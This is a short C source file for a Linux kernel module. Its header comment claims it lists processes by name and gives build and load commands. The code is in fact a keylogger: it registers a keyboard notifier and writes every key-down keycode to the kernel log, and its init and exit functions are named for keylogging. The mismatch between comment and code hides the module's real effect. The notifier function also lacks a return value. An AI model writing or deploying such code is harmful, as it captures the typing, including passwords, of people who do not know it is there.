/*
  A kernel module to list process by their names. Print when loading the module.
  In the terminal, compile this module with "make" and load it with "sudo insmod process.ko". 
  Check the result of printk by “dmesg”
  Unload it with "sudo rmmod process.ko".
*/

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/sched.h> // task_struct definition
#include <asm/unistd.h>
#include <linux/list.h>
#include <linux/init_task.h>
#include <linux/keyboard.h>

MODULE_LICENSE("GPL v2");

//Keyboard Observer Block
int observer_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
  struct keyboard_notifier_param *param = _param;

  if (code == KBD_KEYCODE) {
    //printk(KERN_DEBUG "KEYCODE: %i CONDITION: %s CONDITION VAL: %d\n", param->value, (param->down ? "down" : "up"), param->down); //Shows Everything
	if(param->down == 1){
		printk(KERN_DEBUG "%i", param->value);//Only print down keypress
	}

  }  
}

static struct notifier_block nb = {
	.notifier_call = observer_notify

};

static int __init keylogger_init(void)
{
  register_keyboard_notifier(&nb);
  return 0;
}

static void __exit keylogger_release(void)
{
  unregister_keyboard_notifier(&nb);
}

module_init(keylogger_init);
module_exit(keylogger_release);


